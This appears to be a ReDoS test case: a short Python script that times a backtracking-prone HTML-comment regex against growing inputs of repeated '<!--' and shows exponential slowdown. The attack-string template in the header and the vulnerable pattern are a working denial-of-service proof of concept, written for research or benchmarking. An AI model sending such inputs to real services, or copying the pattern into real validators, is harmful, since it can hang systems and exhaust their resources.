# 2923
# ^<\!\-\-(.*)+(\/){0,1}\-\->$
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"<!--"*8+"! _1SLQ_2"

import re
from time import perf_counter

regex = """^<\!\-\-(.*)+(\/){0,1}\-\->$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "<!--" * i * 1 + "! _1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")